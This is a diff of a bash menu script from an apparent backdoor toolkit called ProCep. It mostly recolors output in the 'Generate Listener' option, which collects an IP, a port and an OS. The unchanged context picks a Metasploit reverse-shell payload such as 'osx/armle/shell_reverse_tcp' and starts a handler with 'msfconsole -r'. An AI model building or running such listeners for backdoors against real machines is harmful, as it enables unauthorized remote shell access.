@@ -73,14 +73,14 @@ then
 fi
 if [ $menuchoice == 3 ]
 then
-  echo -e "[+] Generate Listener - Listener is the module will be listing for the back connection when the backdoor is executed!"
-  echo -e "[?] Please enter your ip that you used for generating the backdoor: [example: 192.167.1.17]" 
+  echo -e "$lightgreen[+] Generate Listener - Listener is the module will be listing for the back connection when the backdoor is executed!"
+  echo -e "$lightgreen[?] Please enter your ip that you used for generating the backdoor: [example: 192.167.1.17]" 
   read -p "$lightgreen$HOSTNAME$lightred /$lightgreen $USERNAME$lightyellow :::>$normal$bold " ip2listen
-  echo -e "[Listener] IP = $ip2listen" 
-  echo -e "[?] Please enter the port you used for generating the backdoor: [example: 4444]" 
+  echo -e "$blue[Listener] IP = $ip2listen" 
+  echo -e "$lightgreen[?] Please enter the port you used for generating the backdoor: [example: 4444]" 
   read -p "$lightgreen$HOSTNAME$lightred /$lightgreen $USERNAME$lightyellow :::>$normal$bold " port2listen
-  echo -e "[Listener] PORT = $port2listen" 
-  echo -e "[?] Please enter the systen that was used to generate the backdoor: [example: Windows]" 
+  echo -e "$blue[Listener] PORT = $port2listen" 
+  echo -e "$lightgreen[?] Please enter the systen that was used to generate the backdoor: [example: Windows]" 
   echo -e "[1]: Linux"
   echo -e "[2]: Windows"
   echo -e "[3]: MacOS / OS X"
@@ -104,11 +104,11 @@ then
        backdoor="osx/armle/shell_reverse_tcp" 
        format="macho";;
   esac
-  echo -e "[Listener] SYSTEM = $backdoor" 
-  echo -e "[?] Name your listener." 
+  echo -e "$blue[Listener] SYSTEM = $backdoor" 
+  echo -e "$lightgreen[?] Name your listener." 
   read -p "$lightgreen$HOSTNAME$lightred /$lightgreen $USERNAME$lightyellow :::>$normal$bold " name2listen 
-  echo -e "[Listener] NAME = $name2listen" 
-  echo -e "[+] Generating listener..." 
+  echo -e "$blue[Listener] NAME = $name2listen" 
+  echo -e "$lightgreen[+] Generating listener..." 
   echo -e "IP / Host = $ip2listen" 
   echo -e "Port = $port2listen"
   echo -e "System = $backdoor" 
@@ -132,7 +132,8 @@ exploit -j
     clear
     msfconsole -r $localdir/Listeners/$name2listen.rc
   else 
-    echo -e "[+] Ok, openeing ProCep menu.."
+    echo -e "$lightgreen[+] Do: msfconsole $localdir/Listeners/$name2listen To execute it"
+    echo -e "$lightgreen[+] Ok, openeing ProCep menu.."
     sleep 2
     cd $localdir/ && ./procepmenu.sh
   fi
